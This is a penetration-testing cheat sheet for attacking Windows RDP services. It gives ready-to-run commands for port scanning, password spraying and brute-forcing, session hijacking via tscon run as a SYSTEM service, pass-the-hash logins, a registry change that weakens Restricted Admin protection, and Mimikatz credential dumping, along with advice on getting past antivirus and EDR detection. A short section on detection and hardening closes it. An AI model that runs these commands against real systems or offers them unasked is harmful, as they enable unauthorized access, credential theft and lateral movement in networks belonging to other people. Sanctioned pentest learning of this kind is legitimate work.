# RDP

## Summary
Credential theft (via Mimikatz), Pass‑the‑Hash (PtH), and session hijacking. RDP also has historic remote code execution vulnerabilities (e.g., BlueKeep CVE‑2019‑0708) — always check patch levels and exposure.

---

## Discovery & Enumeration
- Scan for RDP (default port 3389) and non-standard ports:
```bash
nmap -sV -p3389 --script rdp-enum-encryption,rdesktop-brute <target>
```
- `rdpscan`/`rdpy` can fingerprint RDP versions and enforce detection.
- Check for NLA (Network Level Authentication) — presence increases difficulty for simple brute-force.

**Quick check for NLA with xfreerdp**:
```bash
xfreerdp /v:<ip> /u:invaliduser /cert-ignore
# if prompts for credentials earlier, NLA is enabled
```

---

## Password Spraying & Brute-force
- Prefer password spraying (one password across many accounts) to avoid lockouts.
- Tools: Crowbar (rdp module), Hydra, CrackMapExec (rdp), Ncrack (rdp)

```bash
# Crowbar spraying (single password)
crowbar -b rdp -s 192.168.220.0/24 -U users.txt -c 'Summer2024!'

# Hydra
hydra -L users.txt -p 'Password123!' <ip> rdp

# CrackMapExec (RDP module)
crackmapexec smb <target> -u users.txt -p 'Password123!' --rdp
```

Notes:
- Respect account lockout thresholds and timing — spray slowly.
- Check for exposed RDP-over-HTTP/alternate ports.

---

## Accessing RDP from Linux
- `rdesktop` (old but handy):
```bash
rdesktop -u Administrator -p 'Passw0rd' <ip>
```
- `xfreerdp` (recommended):
```bash
xfreerdp /v:<ip> /u:Administrator /p:'Passw0rd' /cert-ignore
```
- For GUI-less shells use `smb` or `winrm` if available.

---

## Session Hijacking
If you can run commands on a host with sufficient privileges (or create a service), you can hijack active RDP sessions using `tscon`.

**View sessions**:
```powershell
query user
```

**Hijack a session (requires SYSTEM or admin priv):**
```cmd
# from SYSTEM
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>

# Or create a service that runs tscon as SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

**Note:** creating services requires elevated privileges — use psexec, Meterpreter (getsystem), or scheduled tasks as escalation vectors.

---

## Pass‑the‑Hash & NTLM Relaying
- If you have NTLM hashes, you can authenticate without plaintext passwords using PtH to RDP (xfreerdp `/pth` flag) or via Impacket tools (`wmiexec.py`, `psexec.py`).

```bash
# xfreerdp PtH
xfreerdp /v:<ip> /u:Administrator /pth:NTLM_HASH /cert-ignore

# Impacket example
python3 /usr/share/doc/impacket/examples/psexec.py DOMAIN/Administrator@<target> -hashes :NTLM_HASH
```

**Registry tweak for Restricted Admin mode errors** (if encountering Restricted Admin restrictions):
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

## Post‑Access Techniques
- Use Mimikatz to extract plaintext credentials / NTLM hashes from memory (requires SYSTEM or debug privileges).
- Dump credentials and try lateral RDP to other hosts.
- Enable `winrm` for scripted lateral movement if allowed in scope.

**Mimikatz basics (on-windows)**:
```powershell
# as admin
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Note:** some AV/EDR will detect Mimikatz — consider in-memory execution or off-host memory dumps.

---

## Vulnerabilities & CVEs
- CVE‑2019‑0708 (BlueKeep) — pre-RDP 8.1/2012/2016 unpatched systems
- Monitor MSRC and patching state; remote code execution vulnerabilities are rare but severe.

---

## Detection & Hardening Notes (for reporting)
- NLA should be enabled to prevent unauthenticated RDP handshakes.
- Enforce account lockout policies and MFA for remote access.
- Restrict RDP exposure via VPN or jump boxes; log and alert on failed authentication and new source IPs.
- Disable cached credentials where possible and limit local admin accounts.

---

## Quick Cheatsheet
```bash
# Scan
nmap -p3389 --script rdp-enum-encryption -Pn <target>

# Bruteforce (slow spray)
crowbar -b rdp -s <target>/32 -U users.txt -c 'Autumn2024!'

# RDP connect
xfreerdp /v:<ip> /u:Administrator /p:'P@ssw0rd' /cert-ignore

# PtH
xfreerdp /v:<ip> /u:Administrator /pth:NTLM_HASH /cert-ignore
```
